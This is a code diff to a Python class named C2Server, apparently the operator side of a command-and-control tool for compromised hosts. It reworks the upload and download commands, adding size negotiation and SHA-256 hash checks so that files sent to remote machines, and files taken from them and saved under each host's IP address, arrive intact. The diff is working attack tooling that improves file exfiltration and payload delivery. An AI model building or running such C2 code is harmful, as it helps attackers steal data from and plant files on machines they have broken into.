@@ -182,9 +182,16 @@ class C2Server:
 
                     sock.send(f"__UPLOAD__:{remote_path}".encode())
                     if sock.recv(BUFFER_SIZE).decode() == "READY":
-                        with open(local_file, 'rb') as f:
-                            sock.send(f.read())
-                        print(ok(f"Transfer complete: {remote_path}"))
+                        with open(local_file, 'rb') as f: file_data = f.read()
+                        local_hash = hashlib.sha256(file_data).hexdigest()
+                        sock.send(f"SIZE:{len(file_data)}".encode())
+                        if sock.recv(BUFFER_SIZE).decode() == "OK":
+                            sock.send(file_data)
+                            remote_hash = sock.recv(1024).decode()
+                            if remote_hash == local_hash:
+                                print(ok(f"Transfer complete (integrity verified): {remote_path}"))
+                            else:
+                                print(err(f"Transfer failed (hash mismatch): {remote_path}"))
 
                 # --- Download ---
                 elif cmd.lower().startswith('download '):
@@ -197,15 +204,19 @@ class C2Server:
                         sock.send(b"OK")
                         local_path = os.path.join(DOWNLOAD_DIR, f"{ip}_{os.path.basename(remote_file)}")
 
-                        with open(local_path, 'wb') as f:
-                            received = 0
-                            while received < size:
-                                data = sock.recv(min(BUFFER_SIZE, size - received))
-                                if not data:
-                                    break
-                                f.write(data)
-                                received += len(data)
-                        print(ok(f"File saved: {local_path}"))
+                        file_data = b""
+                        while len(file_data) < size:
+                            data = sock.recv(min(BUFFER_SIZE, size - len(file_data)))
+                            if not data: break
+                            file_data += data
+                        with open(local_path, 'wb') as f: f.write(file_data)
+                        local_hash = hashlib.sha256(file_data).hexdigest()
+                        sock.send(b"HASH_REQ")
+                        remote_hash = sock.recv(1024).decode()
+                        if remote_hash == local_hash:
+                            print(ok(f"File saved (integrity verified): {local_path}"))
+                        else:
+                            print(err(f"File saved but integrity check failed: {local_path}"))
 
                 
                 else:
